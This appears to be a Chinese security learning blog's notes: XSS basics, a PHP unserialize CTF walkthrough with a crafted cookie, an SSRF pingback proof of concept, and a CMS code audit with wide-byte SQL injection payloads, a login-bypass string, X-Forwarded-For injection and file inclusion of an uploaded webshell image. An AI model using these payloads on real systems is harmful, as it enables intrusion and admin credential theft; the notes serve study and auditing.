<p>浏览器每次收到数据后都会进行语法的分析，如果分析到合法符号就将其添加到解析树中去，语法在解析生成dom树，解析过程中开始对css元素进行渲染，然后再去执行js，而在dom树在加载过程中，DOM节点也在慢慢建立起来了，所有的节点都均可被修改，创建，或删除。</p>
<p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/PSIywenNZEoKq2vFYg4V4d*sLChskvPr8y.Rkjmlv1c!/b/dL8AAAAAAAAA&amp;bo=9AJOAQAAAAARB4k!&amp;rf=viewer_4" alt></p>
<h2 id="什么是XSS："><a href="#什么是XSS：" class="headerlink" title="什么是XSS："></a>什么是XSS：</h2><p>XSS其实就是通过插入html代码进行拼接注入，通过插入html代码去执行带有恶意的js代码；</p>
<h2 id="XSS的作用："><a href="#XSS的作用：" class="headerlink" title="XSS的作用："></a>XSS的作用：</h2><ul>
<li>盗取管理员cookie</li>
<li>获得内网的ip</li>
<li>获取浏览器保存的明文密码</li>
<li>截取网页的屏幕</li>
<li>网页的键盘输入记录</li>
<li>……</li>
</ul>
<p>##XSS的类型：</p>
<ul>
<li><strong>反射型XSS：</strong>实现xss攻击，但不存进数据库，只对你这次访问有影响，是中非持久型的攻击（一次性的）；</li>
<li><strong>存储型：</strong>实现了xss攻击，但存进了数据库，每次有人访问这个页面，都会自动触发；</li>
<li><strong>DOM型XSS：</strong>不经过后端，DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞，dom – xss是通过url传入参数去控制触发的。</li>
</ul>
<h3 id="检测是否存在XSS："><a href="#检测是否存在XSS：" class="headerlink" title="检测是否存在XSS："></a>检测是否存在XSS：</h3><p>最简单的就是构造语句，使页面弹窗，我们在正常页面传参构造参数使他弹窗，如果弹窗，这证明就是存在xss；</p>
<p><strong>xss其实是通过执行js的代码去执行一些恶意代码，其实有多种方法去执行js语句：</strong></p>
<ul>
<li>我们可以通过构造js标签对<script></script>去执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alter&apos;123456&apos;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>也可以通过JavaScript伪协议去触发即声明URL的主体是任意的javascript代码；</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&lt;a href=javascript:alter(123456)&gt;1&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>也可以通过事件去触发(就是加载文档或图像时触发了事件时去再执行js代码,常见有onload(成功加载执行)，onerror(加载失败执行)，oninput(输入时执行),onclick(点击时执行))；</li>
</ul>
<p>通过插入错误的图片路径，使他加载失败时去执行js代码：</p>
<pre><code>?id=&lt;img src=&apos;6666&apos; onerror=alert&apos;123456&apos;&gt;
</code></pre><p>以上举例都是属于反射型的xss，需要手动去执行，然后触发我们去插入的代码效果；</p>
<p>当然还有许多转义的情况存在，我们需要一步步检查，想办法去变形绕过，从而去执行我们想要的结果；</p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/笔记/">笔记</a>
    </div>


      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-unserialize反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/12/07/unserialize反序列化漏洞/" class="article-date">
      <time datetime="2019-12-06T17:03:10.466Z" itemprop="datePublished">2019-12-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/07/unserialize反序列化漏洞/">PHP unserialize反序列化漏洞</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="什么是序列化-serialize"><a href="#什么是序列化-serialize" class="headerlink" title="什么是序列化(serialize)?"></a>什么是序列化(serialize)?</h2><p>序列化(serialize)是将对象的状态信息<strong>转换为可以存储或传输</strong>的过程，在序列化期间，对象将其当前状态写入到临时或持久性存储区，然后<strong>可以从存储区读取或反序列化出对象的状态，</strong>重新将对象创建出来。通俗的说，就是将php中对象、类、数组、变量匿名函数转化为字符串，方便保存到数据库或文件中。</p>
<p>在php中，可以通过serialize()函数来将对象转变成一个字符串，保存对象的值，方便之后使用或传递。</p>
<h2 id="什么是反序列化-unserialize"><a href="#什么是反序列化-unserialize" class="headerlink" title="什么是反序列化(unserialize)?"></a>什么是反序列化(unserialize)?</h2><p>序列化就是将对象的状态信息转为字符串存储起来，那么反序列化就是再将信息状态拿出来使用(重新转化为对象或者其他)；</p>
<h2 id="反序列化漏洞的产生"><a href="#反序列化漏洞的产生" class="headerlink" title="反序列化漏洞的产生"></a>反序列化漏洞的产生</h2><p>本质上serialize()和unserialize()在PHP内部实现上时没有漏洞的，漏洞的**主要产生是由于应用程序在处理对象、魔术函数以及序列化相关问题的时候导致的。</p>
<p>当传给unserialize()的<strong>参数可控</strong>时,那么用户就可以精心构造的payload。当进行反序列化的时候就有可能会触发对象中一些<strong>魔术方法</strong>，造成意向不到的危害。</p>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0wfphoej31hc0q876u.jpg" alt><br><strong>序列化对于不同类型得到的字符串格式为：</strong></p>
<ul>
<li>String : s:size:value;</li>
<li>Integer : i:value;</li>
<li>Boolean : b:value;(1或0)</li>
<li>Null : N;</li>
<li>Array : a:size:{key definition;value definition;(repeated per element)}</li>
<li>Object : O:strlen:object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}</li>
</ul>
<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>_construct()， <strong>destruct()， </strong>call()， <strong>callStatic()， </strong>get()， <strong>set()， </strong>isset()，<strong>unset()， </strong>sleep()， <strong>wakeup()， </strong>toString()， <strong>invoke()， </strong>set_state()，<strong>clone() 和 </strong>debugInfo() 等方法在 PHP 中被称为”魔术方法</p>
<p>魔术方法是PHP面向对象中特有的特性。它们在特定的情况下被触发，都是以双下划线开头，利用模式方法可以轻松实现PHP面向对象中重载。<br>我们先简单介绍几个魔术方法，如果想详细了解的话，点击<a href="https://www.php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">魔术方法</a>;</p>
<h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h3><p>当我们调试程序时，需要知道是否得出正确的数据。比如打印一个对象时，看看这个对象都有哪些属性，其值是什么，如果类定义了toString方法，就能在测试时，<strong>echo打印对象体，对象就会自动调用它所属类定义的toString方法，</strong>格式化输出这个对象所包含的数据。</p>
<h3 id="construct"><a href="#construct" class="headerlink" title="__construct"></a>__construct</h3><p>当对象创建(new)时会主动调用。但在unserialize()时是不会自动调用的。（构造函数）</p>
<h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><p>当对象被销毁时自动调用（析构函数）</p>
<h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h3><p>如前所提，unserialize()时会自动调用；</p>
<h2 id="靶场实践"><a href="#靶场实践" class="headerlink" title="靶场实践"></a>靶场实践</h2><p>我们进入靶场，我们看到这样一个界面，他叫我们检查代码，那我们就点进去把！<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0wrzoupj31h70q8dgk.jpg" alt><br>这是一道ctf反序列化题目，看到提示flag就藏在本页面中同一目录的flag.php中，我们审计下代码<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0x1m4jej31hc0regmc.jpg" alt><br>①.前面定义了一个类，类中定义了一个方法，而且还是使用魔术方法<strong>toString,里面返回了readme.txt和调用显示source,因为在</strong>toString魔术方法中，所以只要将对象体打印(echo)出来就能调用。<br>highlight_file是高亮显示文件代码的意思；</p>
<p>②.在第一个if判断中，如果存在source以GET方式请求的话，就会实例化对象，并使source=<strong>FILE</strong>,<strong>FILE</strong>指本地当前文件路径，那就是说会调用$s对象中的source并使其等于<strong>FILE</strong>,<strong>FILE</strong>表示当前页面的完整路径，即会读取当前页面，并将对象体打印出来，那么上面的__toSteing也会被调用。</p>
<p>③.如果有存在todos这个cookie，那就<strong>截取cookie前32位长度，与前32位之后长度相对比，如果相等，就将cookie前32位之后的长度进行反序列化。</strong>那如果$_COOKIE[‘todos’]是可控的，那我们能不能<strong>构造payload让②的<strong>FILE</strong>文件改成我们想读取的flag.php文件，并将其序列化，并放到cookie中，并使条件成立，使得将我们想要文件被反序列化后输出出来</strong>，但我们还没看到输出的点。</p>
<p>后面我们发现了这个<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0xew1wlj30hg0p8q37.jpg" alt><br>&lt;?=$todo?&gt;是&lt;?php echo $todo ?&gt;的简写；<br>而$todo是根据$todos数组 foreach遍历出来的值</p>
<p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0xm802pj31hb0f9aaf.jpg" alt><br>我们将<strong>FILE</strong>改成我们要读取的文件名，<strong>因为只有数组才能foreach遍历出值，所以我们要将序列化的对象先转换成数组</strong>，然后是序列化出来结果。</p>
<p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0xvqj2aj30f404uq2r.jpg" alt><br>然后我们要做的下一步是通过让cookie满足条件，使cookie前32位与之后的相等，如果条件成立，那么就会实行反序列化出结果，并将其结果赋给$todos这个数组，然后遍历flag.php输出结果。那么，我们只需要将我们序列化的结果拼接都放进cookie中去，使其条件满足，反序列化出我们需要的结果</p>
<p>因为cookie前32位$h要等于32位之后md5加密后的值$m，所以我们要手动将前32位进行手动md5加密，使其等于32位以后的值。<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0y37gnij31hc0rh77y.jpg" alt><br><code>$h=e2d4f7dcc43ee1db7f69e76303d0105c(手动md5加密)</code><br><code>$m=a:1:{i:0;O:6:&quot;readme&quot;:1:{s:6:&quot;source&quot;;s:8:&quot;flag.php&quot;;}}</code><br><code>md5($m)=e2d4f7dcc43ee1db7f69e76303d0105c</code></p>
<p>所以最后所生成cookie为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">todos=&gt;e2d4f7dcc43ee1db7f69e76303d0105ca:1:&#123;i:0;O:6:&quot;readme&quot;:1:&#123;s:6:&quot;source&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>因为生成cookie会主动进行一次url编码，然后存储后会进行一次url解码，因为我们手动生成cookie，所以我们要进行一次url编码，再将其放到cookie中去<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0ydiyo7j31hc0ipjwd.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0yuvdqej31ax0crwig.jpg" alt><br>将其放入cookie中，刷新，成功拿到flag；<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0zpxd5ej31hc0h6q4a.jpg" alt></p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/笔记/">笔记</a>
    </div>


      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-SSRF-服务器端请求伪造" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/12/07/SSRF-服务器端请求伪造/" class="article-date">
      <time datetime="2019-12-06T17:03:10.461Z" itemprop="datePublished">2019-12-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/07/SSRF-服务器端请求伪造/">SSRF-服务器端请求伪造</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="什么是SSRF"><a href="#什么是SSRF" class="headerlink" title="什么是SSRF?"></a>什么是SSRF?</h1><p>SSRF(Server-Side Request Forgery:<strong>服务器端</strong>请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的<strong>内部系统</strong>。（因为他是从内部系统访问的，所以可以通过它攻击外网无法访问的<strong>内部系统(即内网)</strong>，也就是把目标网站当中间人;即<strong>利用一个可发起网络请求的服务当做跳板来攻击其他服务;</strong></p>
<p>通俗的说就是浏览器去访问服务都是通过浏览器本地去访问的，而SSRF就是攻击者通过命令服务器端去访问另一个服务，<strong>服务器端去访问</strong>并返回了访问数据</p>
<h2 id="SSRF原理详解"><a href="#SSRF原理详解" class="headerlink" title="SSRF原理详解"></a>SSRF原理详解</h2><p>首先，我们要对目标网站的架构了解，脑子了要有一个架构图。比如 ： A网站，是一个所有人都可以访问的外网网站并可以发起网络请求，B网站是一个他们内部的OA网站。</p>
<p>所以，我们普通用户只可以访问a网站，不能访问b网站。但是我们可以通过a网站做中间人，<strong>让a网站去代替我们去访问b网站，并返回数据，</strong>从而达到攻击b网站需求。那如果b网站是个内网网站，那我们就可以去通过a网站进入<strong>攻击外网无法访问的内网系统</strong>，攻击所在内网中网站、程序；</p>
<h2 id="SSRF的作用"><a href="#SSRF的作用" class="headerlink" title="SSRF的作用"></a>SSRF的作用</h2><ul>
<li>扫描内部网络(FingerPrint)(对输入连接没有限制，可以直通内网)</li>
<li>向<strong>内部</strong>主机的<strong>任意主机</strong>的<strong>任意端口</strong>发送我们精心构造的数据表(payload)</li>
<li>DDOS(请求大文件，始终保持连接Keep-Alive Alway)</li>
<li>暴力穷举(users/dirs/files)</li>
<li>内外网Web站点漏洞的利用(比如内网网站存在sql注入，因为是内网，网站管理员防范意识较低，那我们就可以通过存在漏洞达到我们的目的)</li>
<li>内外网主机应用程序漏洞的利用</li>
</ul>
<p>##靶场实战<br>我们进入靶场<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3e2wptko9j31h90fyglw.jpg" alt><br>发现访问的是一个xmlrpc服务，但该服务<strong>只接受POST请求</strong>；我们发现这是一个typeecho的CMS,这个CMS是默认开启了XMLRPC服务的</p>
<p><strong>XML RPC</strong><br>(XML-RPC是一个远程过程调用（远端程序呼叫）（remote procedure call，RPC)的分布式计算协议，通过XML将调用函数封装，并使用http协议做为传输协议的rpc机制，使用xml文本的方式传输命令和数据。)</p>
<p>XMLRPC中有一个叫做pingback协议(pingback,<strong>通知网志系统文章被引用</strong>情况的一种手段)，我们可以直接使用；</p>
<p>POC如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line"> &lt;methodName&gt;pingback.ping&lt;/methodName&gt;</span><br><span class="line"> &lt;params&gt;</span><br><span class="line">    &lt;string&gt;http://127.0.0.1:1&lt;/string&gt;</span><br><span class="line"> &lt;/params&gt;</span><br><span class="line">&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure>
<p>通过刷新抓包，将请求方式修改为POST方式，并将poc代码放到下面<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3e4norujuj30z40qf40e.jpg" alt><br>这段poc说简单点，就是他会通过服务器端去ping内网的地址，并返回信息，通过返回信息知道端口的开放。<br>由于我们不知道开放端口，所以通过burp进行端口爆破<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3e4o051cyj30z40ouq6c.jpg" alt><br>发现开放了两个端口，我们通过提示知道了内网88端口映射12388端口,<br>我们对12388端口进行访问，抓包看返回头，得到flag<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3e4oa3liaj30z40ovju0.jpg" alt></p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/笔记/">笔记</a>
    </div>


      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-sql注入--0day审计案例(2)" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/12/07/sql注入--0day审计案例(2)/" class="article-date">
      <time datetime="2019-12-06T17:03:10.458Z" itemprop="datePublished">2019-12-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/07/sql注入--0day审计案例(2)/">sql注入--0day审计案例(二)</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>我们开始进行代码审计、漏洞挖掘</p>
<h3 id="网站重装漏洞"><a href="#网站重装漏洞" class="headerlink" title="网站重装漏洞"></a>网站重装漏洞</h3><p>一般我要做一个CMS网站，首先要访问目录中的安装目录，进行安装、注册管理员账号。那我们站在黑客角度上想一想，我们如果知道了一个cms的安装目录路径，那我们是不是能进行二次访问进行重新安装呢？这样的话我们是不是就可以重置管理员账号和密码，登入后台进行getshell呢？<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418sjhanvj31h60rbwgy.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418t83yofj31h90pwdj9.jpg" alt><br>这样我们就可以进行重新安装了，而数据库账号密码，我们可以弄一个虚拟空间数据库，比如注入时用到的香港云。</p>
<h3 id="XSS跨站脚本攻击"><a href="#XSS跨站脚本攻击" class="headerlink" title="XSS跨站脚本攻击"></a>XSS跨站脚本攻击</h3><p>我们再来看这个网站，一般而言网站有展示类和功能类。</p>
<p>展示类（比如新闻站、门户站）</p>
<p>功能类（比如商城、OA、系统）</p>
<p>我们看到前台有一个注册功能，如果我们可以拿到一个普通用户的权限是不是更加容易渗透测试？测试的点是不是更多？<br>那么我们去注册一个账户吧！<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418thvsawj31h80osac3.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418tqqwkwj31h60qkdi5.jpg" alt><br>在注册之前，我们先开下burp，看下提交注册的数据包发往哪里去<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418u2kpw2j31gj0qhq6z.jpg" alt><br>发现它通过post方式将参数发送user.php ,我们注意到里面有act传进参数do_reg,我们通过代码审计工具找到user.php<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418ub5ui9j31hc0sgk2s.jpg" alt><br>我们发现这里是检查传进来的注册参数是否为空和有没有空格，并且加入一些检查格式<br>而我们在下面发现sql插入语句<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418uije5fj313b0i4tdu.jpg" alt><br>发现它并没有将注册的值进行过滤，而直接插入数据库中。那么这就很有可能存在XSS和sql注入。</p>
<p>我们先通过一个弹窗看看是否有xss，先抓一个包，并对其邮箱进行插入弹窗语句<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418uxubm8j30z40rkq4p.jpg" alt><br>成功弹窗，这里是一个存储型的XSS。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418wavb2qj31h80pqjt2.jpg" alt></p>
<h3 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h3><p>在插入语句中<br><code>&quot;INSERT INTO &quot;.table(&#39;user&#39;).&quot; (user_id, user_name, pwd, email, reg_time, last_login_time) VALUES (&#39;&#39;, &#39;$user_name&#39;, md5(&#39;$pwd&#39;), &#39;$email&#39;, &#39;$timestamp&#39;, &#39;$timestamp&#39;)&quot;;</code><br>这里插入没有过滤，由于email变量由一对单引号包着，所以我们试着在邮箱后面加个’,看看是否会报错<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418wjbjauj30z40rkmyy.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418wjbjauj30z40rkmyy.jpg" alt><br>发现还是注册成功了，那我们进后台看看<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418wxhl9tj30z50h1wfx.jpg" alt><br>发现’好像被实体化了，就是被\转义了，这好像是php配置中开启了魔术引号，那我们应该想到之前的宽字节注入，在引号前加%df，使其与\%5c合并,从而避免’被转义。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418x765fgj30z40rktag.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418xeyzpej30z40rkjtw.jpg" alt><br>发现报错了，那就说明存在注入<br>尝试使用updatexml的报错<br>构建下语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO blue_user (user_id, user_name, pwd, email, reg_time, last_login_time) VALUES (&apos;&apos;, &apos;allblue1234&apos;, md5(&apos;allblue1234&apos;), &apos;allblue1234@qq.com�\&apos; or updatexml(1,concat(0x7e,(SELECT database())),1),1,1)#\&apos;&apos;, &apos;1560443115&apos;, &apos;1560443115&apos;)</span><br></pre></td></tr></table></figure></p>
<p>发现报错，没有显示我们想要的信息<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418xro0upj30z40rkacp.jpg" alt><br>但我发现放进数据库执行，却能成功(需将%df\  去掉)<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418xzi127j31560lgaeh.jpg" alt><br>那我们只能通过盲注<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO blue_user (user_id, user_name, pwd, email, reg_time, last_login_time) VALUES (&apos;&apos;, &apos;allblue1234&apos;, md5(&apos;allblue1234&apos;), &apos;allblue1234@qq.com�\&apos; or sleep(10),1,1)#\&apos;&apos;, &apos;1560443115&apos;, &apos;1560443115&apos;)</span><br></pre></td></tr></table></figure></p>
<p>以这种格式继续盲注下去。</p>
<p>但我们想到，insert into 是能插入多条数据呢，那我们是不是能通过语句构建，再建立一个用户，然后用子查询填充邮箱处，然后我们登陆这个账号是不是就可以看到邮箱字段里面的内容？<br>我们先抓包<br>这样就插入了两组数据，而在第二组数据中的邮箱就是管理员密码<br>我们执行一下，发现执行失败<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418ydsotkj30z40rktbf.jpg" alt><br>因为这里魔术引号会将引号转义，所以我们利用宽字节知识，将其转为16进制编码<br>allblue2019==&gt;0x616C6C626C756532303139<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418yodkozj30z40rkq6i.jpg" alt><br>注册成功，登录<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418yzxxk0j31gg0ovtaj.jpg" alt><br>将邮箱值进行md5解密，成功得到管理员密码<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418z7jwb3j31ha0ky3zn.jpg" alt></p>
<h3 id="登录框万能密码登录"><a href="#登录框万能密码登录" class="headerlink" title="登录框万能密码登录"></a>登录框万能密码登录</h3><p>我们尝试登录抓包<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418zidhbij30z40rk760.jpg" alt><br>找到传参的位置，在审计工具查找<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418zussp9j31hc0sm49l.jpg" alt><br>发现这里判断了是否为管理员，没有对登录参数进行限制，这可能存在POST注入<br>post注入，首先尝试着使用万能密码登录<br><code>%df&#39;) or 1=1#</code><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g41902f5r4j30z40rkwg9.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4190a2wpfj31hb0i6aae.jpg" alt><br>成功登录<br>然后登录后修改资料处也存在SQL注入和XSS</p>
<h3 id="X-Forwarded-For注入"><a href="#X-Forwarded-For注入" class="headerlink" title="X-Forwarded-For注入"></a>X-Forwarded-For注入</h3><p>我们通过一个普通用户发布了新闻<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4190jiyuoj31hc0lndhp.jpg" alt><br>通过重新注册一个用户对其进行评论<br>评论成功<br>那么这可能也存在XSS。<br>我们评论时先抓个包看看<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4193ify2nj31hc0mlq4z.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4193tropfj30z40rkwgc.jpg" alt><br>发现他会将参数send提交到comment.php,那么我们去看一看</p>
<p>我们发现这里面有一些函数<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4194117l1j31hc0sm116.jpg" alt></p>
<ul>
<li><p>intval()<br>intval() 函数用于获取变量的整数值。<br>intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p>
</li>
<li><p>htmlspecialchars()<br>把预定义的字符 “&lt;” （小于）和 “&gt;” （大于）转换为 HTML 实体</p>
</li>
<li><p>nl2br()<br>在字符串中的新行（\n）之前插入换行符<br>所以XSS肯定是没戏了。</p>
</li>
</ul>
<p>这时，我们看到了他在插入的时候，记录了评论用户的ip，我们发现了getip函数，我们定位一下函数<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4194argjyj31dy0q7n3k.jpg" alt><br>找到了定义的函数，这里有一个getenv，实际上就是获取系统的环境变量</p>
<p>第一个HTTP_CLIENT_IP这个环境变量没有成标准，很多服务器完全没法获取</p>
<p>第二个X-Forwarded-For是个扩展请求头，这个东西可以通过HTTP请求头来修改。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4194mh7qkj31cy0oudle.jpg" alt><br>那么我们是不是可以修改X-Forwarder-For的参数，将参数插入到ip中，那么ip的值就会放入sql语句中执行呢?<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4194usqr2j31h90nxtas.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g41953pdecj30zh0kydhq.jpg" alt><br>我们给个分号测试一下<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4195bynenj31ga0nltar.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4195kp9p5j31hc0fdt8t.jpg" alt><br>发现成功报错<br>因为X-Forwarded-For是直接获取的，所以不会出现魔术引号。<br>这里我们直接用sqlmap 就能直接跑出来了<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4195ssd3yj30xz0hrq4w.jpg" alt></p>
<h3 id="数据库备份文件泄露"><a href="#数据库备份文件泄露" class="headerlink" title="数据库备份文件泄露"></a>数据库备份文件泄露</h3><p>有时候，管理员在备份数据库的时候，直接默认将备份文件直接放在网站目录下，这样其实是很危险的，很容易被黑客摸出来。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g41964opglj31hc0omjv5.jpg" alt><br>我们登入后台，发现了一个数据库备份，好，那我们将数据库备份<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4196cvcatj31hc0bsdgs.jpg" alt><br>我们到网站目录看一下<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4196lq5n3j30st05pt8r.jpg" alt><br>发现他的命名规则是备份的年月日，那如果我们拿到一个CMS，知道他的备份目录，是不是可以尝试着爆破一下备份文件<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4196v5eboj31gt0q4wft.jpg" alt></p>
<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>文件包含，首先需要找到包含函数<br>我们在找到了一个貌似可以控制的include函数，不过需要act参数=pay的时候才能执行<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g419766cocj31e10osn4c.jpg" alt><br>最后在购买充值卡那找到<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4197f34tlj31hc0m241t.jpg" alt><br>我们先找到一个能上传图片马的上传点<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4197mhek1j31h90jqtac.jpg" alt><br>成功上传<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4197vln3uj31h80k40t7.jpg" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &apos;include/payment/&apos;.$_POST[&apos;pay&apos;].&quot;/index.php&quot;;</span><br></pre></td></tr></table></figure></p>
<p>文件包含的路径</p>
<p>那么我们将木马路径传入到post参数中，那么路径为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pay=../../data/upload/face_pic/15605135978.jpg</span><br></pre></td></tr></table></figure></p>
<p>这样的话，包含语句就会变成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &apos;include/payment/../../data/upload/face_pic/15605135978.jpg/index.php&quot;;</span><br></pre></td></tr></table></figure></p>
<p>但是这样的话，后面还有个index。php，他会去加载index.php,会对加载图片马有所影响，那么我们需要将index.php截取掉，这里00截断试过了，php低版本才会存在这样的截断。</p>
<p>在这里我们可以尝试一个字符串截断的方法（Windows的路径不能超过60个字符）在Windows API中，路径的最大长度为MAX_PATH，MAX_PATH被定义为260。</p>
